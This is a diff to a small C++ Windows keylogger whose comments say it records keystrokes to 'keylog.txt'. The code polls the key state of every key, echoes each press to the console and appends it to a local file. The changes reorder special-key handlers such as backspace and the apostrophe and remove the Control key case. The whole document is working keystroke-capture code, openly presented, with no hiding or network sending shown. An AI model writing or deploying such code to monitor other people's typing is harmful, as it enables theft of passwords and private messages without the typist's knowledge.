@@ -1,9 +1,8 @@
-/*
-This program records keystrokes in a text file  
-*/
+//This program records keystrokes in a text file called "keylog.txt"
 
 #define _WIN32_WINNT 0x0500
 #include <Windows.h>
+#include <winuser.h>
 #include <string>
 #include <fstream> 
 #include <iostream>
@@ -29,6 +28,7 @@ void LOG(string keystroke)
 This bool function is used for the special keys on a keyboard.
 If a special key is pressed, the program will refer back to the LOG function
 and it will record the special key that was pressed
+For keys such as the return key, 
 */
 
 bool SpecialKeys(int S_key)
@@ -43,6 +43,10 @@ bool SpecialKeys(int S_key)
 		cout << "\n";
 		LOG("\n");
 		return true;
+	case VK_BACK:
+		cout << "\b";
+		LOG("\b");
+		return true;
 	case VK_OEM_PERIOD:
 		cout << ".";
 		LOG(".");
@@ -51,13 +55,13 @@ bool SpecialKeys(int S_key)
 		cout << ",";
 		LOG(",");
 		return true;
+	case VK_OEM_7:
+		cout << "'";
+		LOG("'");
+		return true;
 	case VK_SHIFT:
 		cout << "#SHIFT#";
 		LOG("#SHIFT#");
-		return true;
-	case VK_BACK:
-		cout << "\b";
-		LOG("\b");
 		return true;
 	case VK_CAPITAL:
 		cout << "#CAPS_LOCK#";
@@ -83,14 +87,6 @@ bool SpecialKeys(int S_key)
 		cout << "#RIGHT";
 		LOG("#RIGHT_ARROW");
 		return true;
-	case VK_CONTROL:
-		cout << "#CONTROL";
-		LOG("#CONTROL");
-		return true;
-	case VK_OEM_7:
-		cout << "'";
-		LOG("'");
-		return true;
 	default: 
 		return false;
 	}
@@ -108,12 +104,10 @@ int main()
 		{
 			if (GetAsyncKeyState(key) == -32767)
       			{
-				//Checks to see if a special key was pressed
-				if (SpecialKeys(key) == false) 
+				if (SpecialKeys(key) == false) //Checks to see if a special key was pressed
         			{
-					//If not, the program records the character key that was pressed
 					fstream logFile;
-					logFile.open("keylog.txt", fstream::app);
+					logFile.open("keylog.txt", fstream::app); //If not, the program records the character key that was pressed
 					if (logFile.is_open())
           				{
 						logFile << char(key); 
